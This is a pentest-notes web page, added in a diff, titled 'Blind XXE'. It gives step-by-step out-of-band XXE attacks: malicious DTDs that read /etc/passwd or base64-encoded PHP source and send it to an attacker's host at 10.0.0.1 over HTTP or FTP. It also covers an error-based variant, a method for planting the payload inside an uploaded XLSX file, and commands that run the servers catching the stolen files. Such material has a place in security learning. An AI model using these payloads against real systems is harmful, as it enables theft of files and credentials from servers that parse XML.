@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Blind XXE - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Blind XXE", url: "#_top", children: [
+              {title: "Data Exfiltration via Out-Of-Band", url: "#data-exfiltration-via-out-of-band" },
+              {title: "Data Exfiltration via Out-Of-Band (Error-based)", url: "#data-exfiltration-via-out-of-band-error-based" },
+              {title: "Inside XLSX File", url: "#inside-xlsx-file" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="blind-xxe">Blind XXE</h1>
+<p>XXE is a type of vulnerability that allows an attacker to inject and execute malicious XML code on a server that parses XML input, without directly receiving any feedback or response from the server.</p>
+<div class="language-text highlight"><pre><span></span><code>- [blind](https://portswigger.net/web-security/xxe/blind)
+</code></pre></div>
+<h2 id="data-exfiltration-via-out-of-band">Data Exfiltration via Out-Of-Band</h2>
+<h3 id="1-create-a-malicious-dtd">1. Create a Malicious DTD</h3>
+<p>We need to prepare the dtd file (named <strong>"exploit.dtd"</strong> here) to retrieve the target file.<br />
+Replace the ip address with your own.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>&lt;!-- &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot; --&gt;
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http://10.0.0.1/?x=%file;&#39;&gt;&quot;&gt;
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>%eval;
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>%exfiltrate;
+</span></code></pre></div>
+<p>Then host it on web server.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>sudo python3 -m http.server 80
+</span></code></pre></div>
+<p><br /></p>
+<h3 id="2-insert-xxe">2. Insert XXE</h3>
+<p>In http request body, insert the following XXE payload.<br />
+Same as above DTD, replace the ip address with your own</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;http://10.0.0.1/exploit.dtd&quot;&gt; %xxe;]&gt;
+</span></code></pre></div>
+<p>Now send request. We might retrieve the local file of the target system via web server.</p>
+<p><br /><br /></p>
+<h2 id="data-exfiltration-via-out-of-band-error-based">Data Exfiltration via Out-Of-Band (Error-based)</h2>
+<p>If the website shows error messages when performing XXE, we can use the following malicious DTD.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;file:///invalid/%file;&#39;&gt;&quot;&gt;
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>%eval;
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>%exfil;
+</span></code></pre></div>
+<p>For the rest, please refer to the section above.</p>
+<p><br /><br /></p>
+<h2 id="inside-xlsx-file">Inside XLSX File</h2>
+<p>An XLSX file is a Microsoft Excel spreadsheet.</p>
+<p><br /></p>
+<h3 id="1-create-a-xlsx-file">1. Create a XLSX File</h3>
+<p>First we need to create a XLSX file using some software such as LibreOffice Calc.</p>
+<p><br /></p>
+<h3 id="2-extract-the-xlsx-file">2. Extract the XLSX File</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>7z -oXXE xxe.xlsx
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>cd XXE
+</span></code></pre></div>
+<p>We should get files such as <strong>“.xml”</strong>.</p>
+<p><br /></p>
+<h3 id="3-add-blind-xxe-payload-in-the-xml-file">3. Add Blind XXE Payload in the XML File.</h3>
+<p>Insert the following payload into the <strong><code>xl/workbook.xml</code></strong>.<br />
+Replace the <strong>“10.0.0.1”</strong> with your local ip address.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>&lt;!DOCTYPE cdl [&lt;!ELEMENT cdl ANY &gt;&lt;!ENTITY % asd SYSTEM &quot;http://10.0.0.1/xxe.dtd&quot;&gt;%asd;%c;]&gt;
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>&lt;cdl&gt;&amp;rrr;&lt;/cdl&gt;
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>&lt;workbook xmlns=&quot;http://schemas.openxmlformats.org/spreadsheetml/2006/main&quot; xmlns:r=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships&quot;&gt;
+</span></code></pre></div>
+<p><br /></p>
+<h3 id="4-rebuild-the-xlsx-file">4. Rebuild the XLSX File.</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>cd XXE
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>7z u ../xxe.xlsx *
+</span></code></pre></div>
+<p><br /></p>
+<h3 id="5-create-xxe-inside-a-dtd-file">5. Create XXE inside a DTD File</h3>
+<p>Create <strong>“xxe.dtd”</strong>.<br />
+Replace <strong>“10.0.0.1”</strong> with your local ip address.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>&lt;!ENTITY % d SYSTEM &quot;file:///etc/passwd&quot;&gt;
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>&lt;!ENTITY % c &quot;&lt;!ENTITY rrr SYSTEM &#39;ftp://10.0.0.1:2121/%d;&#39;&gt;&quot;&gt;
+</span></code></pre></div>
+<p><br /></p>
+<h3 id="6-start-a-local-server">6. Start a local server</h3>
+<p>Serve the DTD file using <a href="https://github.com/staaldraad/xxeserv">xxeserv</a>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>git clone https://github.com/staaldraad/xxeserv.git
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>cd xxeserv
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>go mod init xxeftp.go
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>go build
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>go run xxeftp.go -o files.log -p 2121 -w -wd public -wp 8000
+</span></code></pre></div>
+<p>In another terminal, start a web server in the directory where “xxe.dtd” located.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>sudo python3 -m http.server 80
+</span></code></pre></div>
+<p>Now upload <strong>“xxe.xlsx”</strong> file in the website. We should get the content of the desired file.</p>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/web/security-risk/blind-xxe.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
